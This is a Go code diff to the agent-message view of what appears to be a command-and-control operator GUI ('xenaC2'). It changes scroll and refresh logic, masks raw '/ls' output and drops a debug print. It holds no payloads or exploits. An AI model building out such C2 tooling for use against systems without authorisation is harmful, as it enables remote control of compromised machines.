@@ -69,7 +69,7 @@ func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
 	messagesTxtScroll := container.NewVScroll(messagesTxt)
 
 	lastMsgsCount := 0
-	wasRespUpdated := false
+	updatedOnRespID := ""
 	updateMsg := func() {
 		messages, _ = xenaC2.FetchMessages(agent.ID)
 
@@ -77,10 +77,6 @@ func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
 
 		i := 0
 		for _, msg := range messages {
-			if len(msg.Response) != 0 {
-				wasRespUpdated = true
-			}
-
 			txt := msg.Request
 			if len(msg.FriendlyTitle) != 0 {
 				txt = msg.FriendlyTitle
@@ -92,20 +88,33 @@ func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
 			}
 			i++
 
+			respTxt := msg.Response
+			if msg.Request == "/ls" {
+				respTxt = "[serialized list of file records, raw json not displayed]"
+			}
+
 			messagesTxt.Segments[i] = &widget.TextSegment{
 				Style: widget.RichTextStyleCodeInline,
-				Text:  msg.Response + "\n",
+				Text:  respTxt + "\n",
 			}
 			i++
 		}
 
-		messagesTxt.Refresh()
-		if lastMsgsCount != len(messages) || wasRespUpdated {
+		// Scroll to bottom if latest message got a response.
+		if len(messages) != 0 && messages[len(messages)-1].ID != updatedOnRespID && len(messages[len(messages)-1].Response) != 0 {
+			updatedOnRespID = messages[len(messages)-1].ID
+			messagesTxt.Refresh()
+			messagesTxtScroll.ScrollToBottom()
+		} else {
+			// Don't refresh the messages text if no new messages are present and no response was received to the latest message.
+			if lastMsgsCount != len(messages) {
+				messagesTxt.Refresh()
+			}
+		}
+		// Scroll to bottom if there is new message.
+		if lastMsgsCount != len(messages) {
 			messagesTxtScroll.ScrollToBottom()
 			lastMsgsCount = len(messages)
-			if wasRespUpdated {
-				wasRespUpdated = false
-			}
 		}
 	}
 
@@ -250,9 +259,6 @@ func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
 								Warn("Failed to request file upload, exception: " + err.Error())
 								return
 							}
-
-							jj, _ := json.Marshal(fileRecord)
-							fmt.Println(string(jj))
 
 							newMsg := xenaC2.Message{
 								ID:      uuid.New().String(),
